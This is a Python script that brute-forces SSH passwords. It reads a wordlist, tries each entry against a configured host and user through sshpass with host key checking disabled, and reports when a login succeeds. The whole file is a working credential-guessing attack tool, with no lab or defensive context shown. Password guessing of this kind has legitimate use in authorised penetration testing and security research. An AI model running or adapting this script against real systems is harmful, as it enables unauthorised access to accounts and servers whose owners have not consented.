import subprocess
import time

from config import SSH_HOST, SSH_PORT, SSH_USER


with open("wordlists/passwords.txt", "r") as file:
    for password in file:
        password = password.strip()

        if not password:
            continue

        print(f"Trying: {password}")

        result = subprocess.run(
            [
                "sshpass",
                "-p", password,
                "ssh",
                "-p", str(SSH_PORT),
                "-o", "StrictHostKeyChecking=no",
                "-o", "UserKnownHostsFile=/dev/null",
                f"{SSH_USER}@{SSH_HOST}",
                "echo Connected"
            ],
            capture_output=True,
            text=True
        )

        print("Exit code:", result.returncode)

        if result.returncode == 0:
            print(f"[+] Password found: {password}")
            break

        time.sleep(0.3)